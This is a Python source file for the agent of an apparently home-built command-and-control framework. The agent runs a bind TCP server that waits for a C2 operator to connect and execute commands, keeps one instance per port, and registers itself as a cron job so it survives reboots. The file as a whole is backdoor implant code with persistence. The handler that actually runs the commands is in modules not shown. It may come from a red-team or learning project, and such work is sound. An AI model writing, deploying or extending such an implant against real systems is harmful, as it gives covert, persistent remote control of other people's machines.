import sys
import os

# Add the project root directory to sys.path
sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../')

from protocol import validator
from agent.agent_connection_handler import ConnectionHandler
import persistency
import socket
import argparse
import uuid


# The agent's server is a bind TCP connection server.
# It will wait for a C2 client to connect to it and execute its commands



def parse_arguments():
    parser = argparse.ArgumentParser(description="Agent Bind TCP Server")
    parser.add_argument("--src_ip", type=str, help="Source IP the server will be listening on", default="0.0.0.0")
    parser.add_argument("src_port", type=int, help="Source port the server will be listening on")
    # parser.add_argument("uuid", help="Agent's uuid4 string")  # optional

    args = parser.parse_args()
    return args.src_ip, args.src_port



def generate_agent_uuid():
    print("[+] Trying to get agent's UUID from path")
    # try to read the agent's uuid from local file first
    agent_root_dir = os.path.dirname(os.path.abspath(__file__))
    uuid_file_path = os.path.join(agent_root_dir, "uuid")
    if os.path.isfile(uuid_file_path):
        with open(uuid_file_path, 'r') as f:
            agent_uuid = f.read()
            print(f"[+] UUID found: {agent_uuid}")
            return agent_uuid

    print("[-] agent's UUID not found on path. Generating new UUID")
    # generate new uuid if first run
    agent_uuid = str(uuid.uuid4())[:8] #first 8 chars from the uuid4 strings
    with open(uuid_file_path, 'w') as f:
        f.write(agent_uuid)

    print(f"[+] UUID found: {agent_uuid}")
    return agent_uuid


def get_cmdline():
    # Get the full command line by combining executable with script args
    script_path = os.path.abspath(sys.argv[0])
    args = sys.argv[1:]
    cmdline = [sys.executable, script_path] + args
    return ' '.join(cmdline)



class ThreadedServer:
    def __init__(self, src_ip, src_port):
        self.agent_uuid = generate_agent_uuid()
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        validator.validate_ip(src_ip)
        self.src_ip = src_ip
        validator.validate_port(src_port)
        self.src_port = src_port
        # todo: #to-fill
        self.client_handlers = []


    def start(self):
        persistency.create_cron(get_cmdline())  # register the server in cron job
        if persistency.is_server_running(self.src_port):  # checking if the listening port is already used, keeping only single instance of the agen't server per port
            print(f"[+] Agent server already running on port {self.src_port}. Exiting")
            return

        print(f"[+] Agent server isn't running. Starting agent's server...")
        print(f"[+] Trying to bind {self.src_ip}:{self.src_port}")
        self.server_socket.bind((self.src_ip, self.src_port))
        print(f"[+] Server listening on {self.src_ip}:{self.src_port}")
        self.server_socket.listen(1)  # we expect to receive commands from only one connecting C2 server

        print(f"[+] Waiting for incoming connections")
        try:
            while True:
                client_socket, client_address = self.server_socket.accept()
                handler = ConnectionHandler(client_socket, client_address, self.agent_uuid)
                handler.start()  # Start the new thread for handling the connection
                self.client_handlers.append(handler)
        except KeyboardInterrupt:
            print("\nServer shutting down.")
            self.stop()
    # todo: #to-fill

    def stop(self):
        """
        Stop the server and all running client handlers.
        """
        print("Stopping all client handlers...")
        for handler in self.client_handlers:
            handler.stop()
        self.server_socket.close()

def main():
    src_ip, src_port = parse_arguments()
    print("[+] Agent server starting")
    ThreadedServer(src_ip, src_port).start()



if __name__ == "__main__":
    main()